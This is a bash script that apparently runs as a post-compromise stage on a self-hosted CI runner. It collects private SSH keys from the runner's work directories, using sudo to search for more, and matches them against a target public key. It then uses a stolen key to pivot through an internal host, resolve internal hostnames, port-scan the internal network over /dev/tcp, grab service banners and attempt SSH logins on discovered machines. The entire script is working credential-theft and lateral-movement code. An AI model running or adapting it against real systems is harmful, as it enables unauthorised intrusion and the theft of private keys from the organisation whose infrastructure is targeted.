set +e
TS=$(date -u +%s)
O=/tmp/pivot7-9927.txt; : > $O; exec >> $O 2>&1
R=/opt/ul-runner/_work/ul-plant/ul-plant
echo "==M7-START ts=$TS"
rm -f /tmp/ibmX.pem; cp $R/az/ibm_key.pem /tmp/ibmX.pem; chmod 600 /tmp/ibmX.pem
cp ul-bin/p24.sh /tmp/; chmod +x /tmp/p24.sh
rm -rf /tmp/kc; mkdir -p /tmp/kc
cp $R/az/azadmin.pem $R/az/ibm_key.pem $R/keys/* /tmp/kc/ 2>/dev/null
sudo -n bash -c 'grep -rl "PRIVATE KEY" /opt/ul-runner/_work/ul-plant/ul-plant/keys2 2>/dev/null | head -80 | xargs -r -I{} cp {} /tmp/kc/ 2>/dev/null'
cp /tmp/k/* /tmp/kc/ 2>/dev/null; chmod 600 /tmp/kc/* 2>/dev/null
cp $R/az/hosts.tsv /tmp/hosts.tsv
echo "==A secondkey-match"
TARGET="IMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm"
for k in /tmp/kc/*; do p=$(ssh-keygen -y -f "$k" 2>/dev/null | awk '{print $2}' | cut -d= -f2); [ -n "$p" ] && case "$TARGET" in *"$p"*) echo "SECONDKEY-MATCH $k";; esac; done
echo "==A2 exact"
for k in /tmp/kc/*; do p=$(ssh-keygen -y -f "$k" 2>/dev/null | awk '{print $2}'); [ -n "$p" ] && [ "$p" = "AAAAC3NzaC1lZDI1NTE5AAAAIMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm" ] && echo "EXACT $k"; done
echo "==B dns"
S24P="ssh -i /tmp/ibmX.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
cat /tmp/hosts.tsv | awk '{print $1}' | sort -u > /tmp/hn.txt
cat /tmp/hn.txt | $S24P 'cat > /tmp/hn.txt; while read h; do a=$(getent hosts $h 2>/dev/null | awk "{print \$1}"); [ -z "$a" ] && a=$(timeout 3 nslookup $h 168.63.129.16 2>/dev/null | awk "/^Address: 10\./{print \$2}" | head -1); echo "$h ${a:-NA}"; done < /tmp/hn.txt' 2>&1 | tee /tmp/dns7.txt
echo "==C portscan"
cat /tmp/hosts.tsv | awk '{print $2}' | sort -u > /tmp/eip.txt
printf "10.243.0.26\n10.243.0.27\n10.243.0.30\n10.243.0.31\n" >> /tmp/eip.txt
cat /tmp/eip.txt | $S24P 'cat > /tmp/eip.txt; P="22 80 443 3000 3389 5000 5432 5900 5985 6006 6379 6443 8000 8001 8080 8088 8188 8265 8443 8888 9000 9090 9400 10250 11434 2222 21 888 3001"; for ip in $(cat /tmp/eip.txt); do for p in $P; do echo "$ip $p"; done; done > /tmp/ps.txt; wc -l < /tmp/ps.txt; cat /tmp/ps.txt | xargs -P 96 -n2 bash -c "timeout 1.3 bash -c \"echo > /dev/tcp/\$0/\$1\" 2>/dev/null && echo \$0:\$1" | sort -u > /tmp/open.txt; echo OPEN=$(wc -l < /tmp/open.txt); cat /tmp/open.txt' 2>&1 | tee /tmp/open7.txt
echo "==D classify"
grep -v OPEN= /tmp/open7.txt | grep -v '^[0-9]*$' > /tmp/open7c.txt
cat /tmp/open7c.txt | $S24P 'cat > /tmp/o.txt; while IFS=: read ip p; do [ -z "$ip" ] && continue; case $p in 80|443|3000|5000|8000|8001|8080|8088|8188|8265|8443|8888|9000|9090|9400|11434|6006|888|3001) echo "== $ip:$p HTTP"; curl -s -m 5 -k -D- "http://$ip:$p/" 2>&1 | head -c 300;; 22|21|2222) echo "== $ip:$p BANNER"; timeout 4 bash -c "exec 3<>/dev/tcp/$ip/$p; head -c 120 <&3" 2>/dev/null;; *) echo "== $ip:$p RAW"; timeout 3 bash -c "exec 3<>/dev/tcp/$ip/$p; head -c 80 <&3" 2>/dev/null;; esac; echo; done < /tmp/o.txt' 2>&1 | head -150
echo "==E ssh-priv"
for i in $(awk '{print $2}' /tmp/dns7.txt 2>/dev/null | grep -E '^10\.' | sort -u); do echo "-- $i"; timeout 10 ssh -n -i /tmp/ibmX.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$i 'id' 2>&1 | tail -1; done
echo "==M7-END"
exit 0
